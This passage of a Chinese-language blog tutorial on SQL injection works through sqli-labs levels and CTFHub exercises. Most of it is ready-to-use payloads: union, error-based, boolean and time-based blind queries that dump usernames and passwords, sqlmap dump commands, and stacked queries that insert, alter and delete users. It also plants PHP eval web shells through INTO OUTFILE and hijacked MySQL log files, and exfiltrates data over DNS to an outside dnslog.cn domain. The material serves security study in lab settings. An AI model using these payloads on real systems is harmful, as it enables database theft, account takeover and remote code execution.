+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and (select 1 from (select count(*),concat(0x23,(select group_concat(username,&#x27;~&#x27;,password) from users),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+</span><br></pre></td></tr></table></figure>
+
+<p>但是出现错误了：Subquery returns more than 1 row，原因是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们用concat拼接成的x太长导致内存临时表放不下，于是改用磁盘临时表，磁盘临时表的底层处理逻辑和内存表不一样，它完美免疫了rand()重复计算的那个Bug，于是磁盘临时表把数据分成了两组（尾号为0的一组，尾号为1的一组），一共2行数据。没有实现报错，而外层还有一个and逻辑运算符，它要求左右两边必须是一个单一的值（比如 True AND False）。如果右边的括号 (SELECT 1 FROM ...) 扔给它2行或更多行的数据，就会出现错误：Subquery returns more than 1 row。</span><br></pre></td></tr></table></figure>
+
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>当我们改变前端页面传输给后台sql参数时，页面没有显示相应内容也没有显示报错信息时，页面呈现出两种状态，正常或者不正常。根据这两种状态可以判断我们输入的语句是否查询成功。不能使用联合查询注入和报错注入，这时我们可以考虑是否为基于布尔的盲注。</p>
+<p>以Less-8为例：</p>
+<img src="/2026/02/22/SQL/8-1.png" class="" title="8-1">
+
+<img src="/2026/02/22/SQL/8-2.png" class="" title="8-2">
+
+<p>这两个页面中前一个为真页面，后一个为假页面，利用布尔盲注需要涉及新函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii()：该函数可以将字母转换为其对应的ascii码</span><br><span class="line">length()：该函数可以计算字符串长度</span><br></pre></td></tr></table></figure>
+
+<p>基于这条我们构造如下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and ascii(substring((select database()),1,1))=115 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过substring()将查询到的字符串的第一个字母取出判断他的ascii码是否为115，为真就显示真页面，为假就显示假页面</p>
+<img src="/2026/02/22/SQL/8-3.png" class="" title="8-3">
+
+<p>再根据ascii字符对照表知道数据库名的第一个字符为s，同理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;=115 --+//查询表名第一个字母 </span><br><span class="line">/?id=1&#x27; and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=database()),1,1))&gt;=115 --+//查询列名第一个字母</span><br><span class="line">/?id=1&#x27; and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;=115 --+ //查询想要的表中第一个列名的第一个字母</span><br><span class="line">/?id=1&#x27; and ascii(substring((select group_concat(username,&#x27;~&#x27;,password) from users),1,1))&gt;=115 --+ //查询想要的内容的第一个字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>时间盲注与布尔盲注差不多，如果页面不存在真页面与假页面的区别，就可以使用时间盲注，这里以Less-9为例：</p>
+<img src="/2026/02/22/SQL/9-2.png" class="" title="9-2">
+
+<img src="/2026/02/22/SQL/9-1.png" class="" title="9-1">
+
+<p>可以看到没有区别，这里再次引进新的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sleep(x)：延迟x秒后回显页面</span><br><span class="line">if()：判断语句</span><br><span class="line"></span><br><span class="line">if(1=1,sleep(1),sleep(3)) //如果1=1为真，那么执行sleep(1)，否则执行sleep(3)</span><br></pre></td></tr></table></figure>
+
+<p>根据这些信息，构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and if(1=2,sleep(1),sleep(3)) --+ //判断闭合符，如果页面延迟3s响应那就说明闭合符为’</span><br><span class="line">/?id=1&#x27; and if(ascii(substring((select database()),1,1))=115,sleep(3),sleep(0)) --+ //查询数据库名的第一个字母</span><br><span class="line">/?id=1&#x27; and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;=115,sleep(3),sleep(0)) --+ //查询表名的第一个字母</span><br><span class="line">/?id=1&#x27; and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=database()),1,1))&gt;=115,sleep(3),sleep(0)) --+ //查询列名的第一个字母</span><br><span class="line">/?id=1&#x27; and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() where  table_name=&#x27;users&#x27;),1,1))&gt;=115,sleep(3),sleep(0)) --+ //查询指定表名的第一个列名的第一个字母</span><br><span class="line">/?id=1&#x27; and if(ascii(substring((select group_concat(userrname,&#x27;~&#x27;,password) from users),1,1))&gt;=115,sleep(3),sleep(0)) --+ //查询指定内容</span><br></pre></td></tr></table></figure>
+
+<p>这样看来一个一个字母查询未免也太麻烦了，所以需要引进一个新的工具：sqlmap</p>
+<p>我将这个工具安装在python2目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -h</span><br></pre></td></tr></table></figure>
+
+<p>这串命令可以查看一些参数</p>
+<p>以CTFHub技能树上的时间盲注为例：</p>
+<p>查数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://sql:5200/Less-9/?id=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p>查表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://sql:5200/Less-9/?id=1&quot; -D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p>查列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://sql:5200/Less-9/?id=1&quot; -D security --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p>查指定表名中的列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://sql:5200/Less-9/?id=1&quot; -D security -T users --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p>查数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://sql:5200/Less-9/?id=1&quot; -D security -T users --dump --batch</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/sqlmap.png" class="" title="sqlmap">
+
+<h1 id="SQL写马"><a href="#SQL写马" class="headerlink" title="SQL写马"></a>SQL写马</h1><h2 id="利用into-outfile"><a href="#利用into-outfile" class="headerlink" title="利用into outfile"></a>利用into outfile</h2><p>需要MySQL具备读写权限，并且知道一个服务器上可以写入文件的文件夹的完整路径</p>
+<p>这里以Less-7为例：</p>
+<img src="/2026/02/22/SQL/7-1.png" class="" title="7-1">
+
+<p>payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\sql\\hack.php&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p>所以如果想保持原数据格式进行输出的话，可以用dumpfile代替outfile</p>
+<p>页面虽然会报错但是会执行，之后可以采用蚁剑连接或者直接RCE</p>
+<h2 id="利用日志文件"><a href="#利用日志文件" class="headerlink" title="利用日志文件"></a>利用日志文件</h2><h3 id="慢日志查询"><a href="#慢日志查询" class="headerlink" title="慢日志查询"></a>慢日志查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1 # 启动慢日志日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;&lt;网站根目录&gt;/hacker.php&#x27; # 修改日志文件的绝对路径和文件名</span><br><span class="line">select &#x27;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>
+
+<h3 id="全局查询日志"><a href="#全局查询日志" class="headerlink" title="全局查询日志"></a>全局查询日志</h3><p>适用于into outfile被禁止或者写入文件被拦截</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;; #查看配置</span><br><span class="line">set global general_log=on; # 默认关闭,开启后记录用户输入的每条命令</span><br><span class="line">set global general_log_file=&#x27;/var/www/html/1.php&#x27;; #设置日志地址,注意后缀是php</span><br><span class="line">select &#x27;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><p>适用于无回显注入，需要介绍一个新函数：load_file()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT load_file(&#x27;文件的绝对路径&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>load_file()是 MySQL 的内置函数，原本的作用是让数据库管理员可以方便地把服务器本地的文本文件内容，直接作为一个字符串读取到 SQL 语句中。</p>
+<p>DNSlog带外注入是OOB的一种，需要用到UNC路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：\\servername\sharename，其中servername是服务器名，sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为 ：\\servername\sharename\directory\filename  其实我们平常在windows中用共享文件时就会用到这种网络地址的形式</span><br></pre></td></tr></table></figure>
+
+<p>需要用到的两个网站：</p>
+<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+<p>当我们将查询结果拼接到域名的前面，当服务器去访问这个地址的时候，我们查看DNS服务器的解析日志就可以了</p>
+<p>以Less-9为例：</p>
+<p>我们先在dnslog.cn中获取一个随机域名</p>
+<img src="/2026/02/22/SQL/dns.png" class="" title="dns">
+
+<p>然后我们构造如下paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27; and (select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.3mk8yd.dnslog.cn\\test&#x27;))) --+</span><br><span class="line"></span><br><span class="line">实际上concat的结果为：\\security.3mk8yd.dnslog.cn\test    \\为转义后的\\\\</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/dnslog.png" class="" title="dnslog">
+
+<p>可以看到security就被带出来了，不过Linux系统不支持UNC路径，并且DNS域名规范中只能包含字母、数字和连字符<code>-</code>，不能含有其他符号，否则DNS查询就会失败，不过也可以使用hex()函数，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27; and (select load_file(concat(&#x27;\\\\&#x27;,hex((select database())),&#x27;.3mk8yd.dnslog.cn\\test&#x27;))) --+</span><br></pre></td></tr></table></figure>
+
+<p>日志中的结果就是：<code>7365637572697479.3mk8yd.dnslog.cn</code></p>
+<p>那么接下来的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27; and (select load_file(concat(&#x27;\\\\&#x27;,hex((select group_concat(table_name) from information_schema.tables where table_schema=database())),&#x27;.3mk8yd.dnslog.cn\\test&#x27;))) --+ //查询表名</span><br><span class="line">/?id=0&#x27; and (select load_file(concat(&#x27;\\\\&#x27;,hex((select column_name from information_schema.columns where table_schema=database() limit 0,1)),&#x27;.3mk8yd.dnslog.cn\\test&#x27;))) --+ //查询第一个列名</span><br><span class="line">/?id=0&#x27; and (select load_file(concat(&#x27;\\\\&#x27;,hex((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)),&#x27;.3mk8yd.dnslog.cn\\test&#x27;))) --+ //查询指定表中的列</span><br><span class="line">/?id=0&#x27; and (select load_file(concat(&#x27;\\\\&#x27;,hex((select concat(username,&#x27;-&#x27;,password) from users limit 0,1)),&#x27;.3mk8yd.dnslog.cn\\test&#x27;))) --+ //limit绕过长度限制</span><br></pre></td></tr></table></figure>
+
+<p>由于DNS协议对域名长度有极其严格的物理限制，单一节点(两个.之间)最长63个字符，完整域名最长253个字符，UNC路径通常有一个MAX_PATH限制，默认是260字符，所以我们需要用到limit或者substring来限制长度</p>
+<h1 id="POST提交注入"><a href="#POST提交注入" class="headerlink" title="POST提交注入"></a>POST提交注入</h1><p>以Less-11为例：</p>
+<img src="/2026/02/22/SQL/11-1.png" class="" title="11-1">
+
+<p>给了我们一个类似登录的界面</p>
+<p>随便输入一串username和password，发现POST了一段内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=123&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+
+<p>需要先查找注入点在哪</p>
+<img src="/2026/02/22/SQL/11-2.png" class="" title="11-2">
+
+<p>当我们把username修改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; or 1=1 #   //POST提交注入中注释符需要修改为#</span><br></pre></td></tr></table></figure>
+
+<p>显示登陆成功，说明注入点在username并且闭合符为<code>&#39;</code>单引号</p>
+<p>同样的接下来就是执行union联合注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passwd=123&amp;submit=Submit&amp;uname=admin&#x27; group by 2 # //判断列数</span><br><span class="line">passwd=123&amp;submit=Submit&amp;uname=0&#x27; union select  database(),2 # //查数据库</span><br><span class="line">passwd=123&amp;submit=Submit&amp;uname=0&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2 # //查表名</span><br><span class="line">passwd=123&amp;submit=Submit&amp;uname=0&#x27; union select (select group_concat(column_name) from information_schema.columns where table_schema=database()),2 # //查列名</span><br><span class="line">passwd=123&amp;submit=Submit&amp;uname=0&#x27; union select (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),2 # //查询指定表中的列名</span><br><span class="line">passwd=123&amp;submit=Submit&amp;uname=0&#x27; union select (select group_concat(username,&#x27;~&#x27;,password) from users),2 # //查询指定内容</span><br></pre></td></tr></table></figure>
+
+<p>同样的，POST提交注入也能实现报错注入和盲注，也能使用 sqlmap</p>
+<h1 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h1><p>页面看不到明显变化，找不到注入点时，可以尝试HTTP头注入</p>
+<h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p>UA注入，即User-Agent注入</p>
+<p>User-Agent，中文名为用户代理，简称UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等</p>
+<p>内容就是浏览器及版本信息，电脑信息等。</p>
+<p>常见用途为限制打开软件，浏览器，以及上网行为管理等。</p>
+<p>以Less-18为例：</p>
+<p>查看源码我们发现在username和password中输入其他字符会被转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($con1, $_POST[&#x27;uname&#x27;]);</span><br><span class="line">$passwd = check_input($con1, $_POST[&#x27;passwd&#x27;]);</span><br><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>而这样一个代码有意思：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>首先要求登陆成功，然后可以修改$uagent的参数（没有做check_input检查），做报错注入（只能做报错注入），在插入信息时执行指令导致出错，反馈错误信息，登录后输出uagent信息包括报错信息，达到注入效果。</p>
+<img src="/2026/02/22/SQL/18-1.png" class="" title="18-1">
+
+<p>成功登陆之后我们能发现他告诉了我们UA是什么，我们尝试在里面加上一些注入语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27; //查数据库</span><br><span class="line">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or &#x27; //查表名</span><br><span class="line">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()))) or &#x27; //查列名</span><br><span class="line">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) or &#x27; //查询指定表中的列</span><br><span class="line">&#x27; or extractvalue(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1))) or &#x27; //查询想要的内容并用limit绕过长度限制</span><br></pre></td></tr></table></figure>
+
+<p>当我们把构造的UA传入后（如果用and连接），代码变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO logs (ip, user_agent, time) VALUES (&#x27;127.0.0.1&#x27;, &#x27;&#x27; and extractvalue(...) and &#x27;&#x27;, &#x27;2026-02-21&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>&#39;&#39;</code>表示False，用and连接一整串都是False，程序就不会往后执行，所以需要用or来代替and</p>
+<h2 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h2><p>这里以Less-19为例：</p>
+<p>与UA注入差不多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/19-1.png" class="" title="19-1">
+
+<p>所以只需要把UA注入里面的payload放在Referer里面就行了</p>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>这关以Less-20为例：</p>
+<img src="/2026/02/22/SQL/20-1.png" class="" title="20-1">
+
+<p>查看源码我们发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[&#x27;uname&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们尝试将cookie修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=Dumb&#x27; and 1=2 #</span><br></pre></td></tr></table></figure>
+
+<p>成功造成了错误界面，我们继续尝试使用union联合注入内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname=Dumb&#x27; order by 3 # //判断列数</span><br><span class="line">uname=0&#x27; union select 1,(select database()),2 # //数据库 </span><br><span class="line">uname=0&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),2 # //表名</span><br><span class="line">uname=0&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()),2 # //列名</span><br><span class="line">uname=0&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),2 # //获取指定表中的列名</span><br><span class="line">uname=0&#x27; union select 1,(select group_concat(username,0x7e,password) from users),2 # //获取指定数据</span><br></pre></td></tr></table></figure>
+
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>堆叠注入就是用分号间隔命令，导致攻击者可以执行增删查改等操作</p>
+<p>以Less-39为例：</p>
+<p>本关为数字型注入，不需要闭合符，直接展示增加用户信息、删除用户信息的操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=520;insert into users(id,username,password)values(520,&#x27;ZLARYY1&#x27;,&#x27;zlaryy&#x27;) --+ //增加</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/39-1.png" class="" title="39-1">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=520;update users set password=123456 where username=&#x27;ZLARYY1&#x27;  --+ //更改</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/39-3.png" class="" title="39-3">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=520;delete from users where username=&#x27;ZLARYY1&#x27;--+ //删除</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/39-2.png" class="" title="39-2">
+
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>当用户提交的恶意数据被存入数据库后，应用程序再把它读取出来用于生成新的SQL语句时，如果没有相应的安全措施，是有可能发生SQL注入的，这种注入就叫做二次注入，也叫做存储型SQL注入，下面来演示一下二次注入</p>
+<p>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。<br>二次注入，可以概括为以下两步:</p>
+<p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
+<p>以Less-24为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[&quot;username&quot;];</span><br><span class="line">$curr_pass= mysqli_real_escape_string($con1, $_POST[&#x27;current_password&#x27;]);</span><br><span class="line">$pass= mysqli_real_escape_string($con1, $_POST[&#x27;password&#x27;]);</span><br><span class="line">$re_pass= mysqli_real_escape_string($con1, $_POST[&#x27;re_password&#x27;]);	</span><br><span class="line"> </span><br><span class="line">if($pass==$re_pass)</span><br><span class="line">&#123;	</span><br><span class="line">	$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只有username没有被转义</p>
+<p>我们需要先注册一个admin’#的用户，密码就随便设一个123吧，然后登录进去</p>
+<img src="/2026/02/22/SQL/24-1.png" class="" title="24-1">
+
+<p>现在给了我们一个更改密码的界面，现在我们更改密码的语句就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
+
+<p>后面的校验current_password被注释掉了，所以我们现在更改的是admin用户的密码，并且不需要知道admin用户的原始密码是什么，这里我们将admin用户的密码修改为zlaryy</p>
+<p>显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password successfully updated</span><br></pre></td></tr></table></figure>
+
+<p>之后我们尝试登录admin用户</p>
+<img src="/2026/02/22/SQL/24-2.png" class="" title="24-2">
+
+<p>成功登录</p>
+<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><h2 id="join、using"><a href="#join、using" class="headerlink" title="join、using"></a>join、using</h2><p>无列名注入主要适用于column关键字被过滤的情况，这里学习两个新的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">join：用于合并两张表</span><br><span class="line">using：表示使用什么字段进行连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在SQL语法中，当你把两张表JOIN（连接）在一起，并且使用 SELECT * 查询时，MySQL 会把两张表的所有列都拼接在一起生成一张新表。但是由于一张表里不允许出现相同的列名，所以如果我们使用两张相同的表拼接在一起，就会报重复列名错误：Duplicate column name &#x27;id&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>以Less-1为例：</p>
+<p>在通过union查询得到数据库名表名之后，我们通过无列名注入查询users表中的所有列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; union select * from (select * from users as a join users as b)as c --+</span><br><span class="line"></span><br><span class="line">//或者不使用union</span><br><span class="line">/?id=1&#x27; and (select * from (select * from users as a join users as b)as c)--+</span><br></pre></td></tr></table></figure>
+
+<p>那么为什么需要最外层的select * from xxxxx as  c呢？</p>
+<p>这是由于只执行<code>select * from users as a join users as b</code>是不会导致列名重复报错的，这段代码结果只是将两个表拼接在一起返回一个结果集，但是我们需要的报错点在于一张表内重复出现相同列名，这段代码返回的并不是一张表，所以需要最外层有一个as c建立一张派生表，将这个结果集输入进去导致重复列名报错</p>
+<img src="/2026/02/22/SQL/join1.png" class="" title="join1">
+
+<p>这样我们成功获得了第一个重复的列名，接下来我希望获得其他重复列名，就需要用到using关键字了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and (select * from (select * from users as a join users as b using(id))as c)--+ //获得username列名</span><br></pre></td></tr></table></figure>
+
+<p>这里using意思就类似于如果遇到与id同名的列就把他们合并为一个而不报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and (select * from (select * from users as a join users as b using(id,username))as c)--+ //获得password列名</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就获得了users表中所有的列名，最后只需要union联合注入查询就可以了</p>
+<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>子查询也是无列名注入的一种，可以不使用join和using，具体原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在MySQL中，如果用UNION联合两句SELECT查询，最终合并出来的表的列名，是由第一句SELECT决定的。</span><br></pre></td></tr></table></figure>
+
+<p>比如：</p>
